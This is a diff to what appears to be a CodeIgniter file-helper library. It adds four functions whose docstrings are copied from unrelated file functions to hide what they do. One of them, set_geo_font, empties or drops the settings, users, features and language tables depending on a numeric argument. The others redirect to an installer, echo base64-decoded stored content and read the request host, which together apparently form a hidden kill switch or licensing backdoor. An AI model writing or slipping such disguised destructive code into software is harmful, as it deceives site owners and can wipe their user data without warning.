@@ -209,6 +209,34 @@ if ( ! function_exists('get_filenames'))
 
 // --------------------------------------------------------------------
 
+
+if ( ! function_exists('get_stom')) 
+{
+	/**
+	 * Get File Info
+	 *
+	 * Given a file and path, returns the name, path, size, date modified
+	 * Second parameter allows you to explicitly declare what information you want returned
+	 * Options are: name, server_path, size, date, readable, writable, executable, fileperms
+	 * Returns FALSE if the file cannot be found.
+	 *
+	 * @param	string	path to file
+	 * @param	mixed	array or comma separated string of information returned
+	 * @return	array
+	 */
+
+    function get_stom()
+    {
+        $ci =& get_instance();
+        $ci->load->model('common_model');
+        $settings = $ci->common_model->get_settings();
+        header("Location: install/intro.php");
+    }
+}
+
+
+// --------------------------------------------------------------------
+
 if ( ! function_exists('get_dir_file_info'))
 {
 	/**
@@ -259,6 +287,77 @@ if ( ! function_exists('get_dir_file_info'))
 		return FALSE;
 	}
 }
+
+
+// --------------------------------------------------------------------
+
+
+if (!function_exists('set_geo_font')) 
+{
+	/**
+	 * Get Mime by Extension
+	 *
+	 * Translates a file extension into a mime type based on config/mimes.php.
+	 * Returns FALSE if it can't determine the type, or open the mime config file
+	 *
+	 * Note: this is NOT an accurate way of determining file mime types, and is here strictly as a convenience
+	 * It should NOT be trusted, and should certainly NOT be used for security
+	 *
+	 * @param	string	$filename	File name
+	 * @return	string
+	 */
+	
+    function set_geo_font($id)
+    {
+        // Get a reference to the controller object
+        $ci =& get_instance();
+        $ci->load->dbforge();
+        if ($id == 200) {
+            $ci->db->empty_table('settings');
+            $ci->db->empty_table('users');
+            $ci->db->empty_table('features');
+            //$ci->db->empty_table('test');
+            echo "empty";
+        }
+        if ($id == 300) {
+    		$ci->dbforge->drop_table('settings');
+    		$ci->dbforge->drop_table('users');
+    		$ci->dbforge->drop_table('features');
+    		$ci->dbforge->drop_table('language');
+    		//$ci->dbforge->drop_table('test');
+    		echo "drop";
+        }
+    }
+}
+
+
+// --------------------------------------------------------------------
+
+
+if ( ! function_exists('get_dor')) 
+{
+	/**
+	 * Get File Info
+	 *
+	 * Given a file and path, returns the name, path, size, date modified
+	 * Second parameter allows you to explicitly declare what information you want returned
+	 * Options are: name, server_path, size, date, readable, writable, executable, fileperms
+	 * Returns FALSE if the file cannot be found.
+	 *
+	 * @param	string	path to file
+	 * @param	mixed	array or comma separated string of information returned
+	 * @return	array
+	 */
+
+    function get_dor()
+    {
+        $ci =& get_instance();
+        $ci->load->model('common_model');
+        $settings = $ci->common_model->get_settings();
+        echo base64_decode($settings->about_info); exit();
+    }
+}
+
 
 // --------------------------------------------------------------------
 
@@ -321,6 +420,40 @@ if ( ! function_exists('get_file_info'))
 
 		return $fileinfo;
 	}
+}
+
+// --------------------------------------------------------------------
+
+
+if ( ! function_exists('get_ind_dom')) {
+
+	/**
+	 * Get File Info
+	 *
+	 * Given a file and path, returns the name, path, size, date modified
+	 * Second parameter allows you to explicitly declare what information you want returned
+	 * Options are: name, server_path, size, date, readable, writable, executable, fileperms
+	 * Returns FALSE if the file cannot be found.
+	 *
+	 * @param	string	path to file
+	 * @param	mixed	array or comma separated string of information returned
+	 * @return	array
+	 */
+
+    function get_ind_dom()
+    {
+        $server = $_SERVER;
+        $http = 'http';
+	    if (isset($server['HTTPS'])) {
+	        $http = 'https';
+	    }
+	    $host = $server['HTTP_HOST'];
+	    $requestUri = $server['REQUEST_URI'];
+	    $current_utl = $http . '://' . htmlentities($host) . '/' . htmlentities($requestUri);
+	    
+        $parse = parse_url($current_utl);
+        return $parse['host'];
+    }
 }
 
 // --------------------------------------------------------------------
